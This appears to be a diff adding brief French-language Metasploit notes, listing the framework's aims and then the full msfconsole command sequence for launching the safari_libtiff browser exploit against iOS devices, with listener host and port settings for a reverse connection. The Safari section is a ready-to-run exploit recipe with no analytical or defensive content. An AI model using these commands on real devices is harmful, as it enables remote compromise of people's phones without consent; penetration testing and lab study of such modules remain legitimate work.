@@ -1,0 +1,29 @@
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+	Metasploit  Framework MSF  (Pentesting tool)
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+[Objectifs]:
+	+Fournir des informations sur les vulnérabilités de systèmes informatiques;
+	+Aider à la pénétration;
+	+Aider au développement de signatures pous les IDSs.
+
+
+[Safari]:
+#curl ipinfo.io/ip
+#use exploit/apple_ios/browser/safari_libtiff 
+#set lport 8080
+#set lhost 192.168.1.18
+#set SRVHOST 192.168.1.18
+#set SRVPORT 8080
+#set reverselistenerbindaddress 1
+#exploit
+
+
+
+
+
+
+
+
+
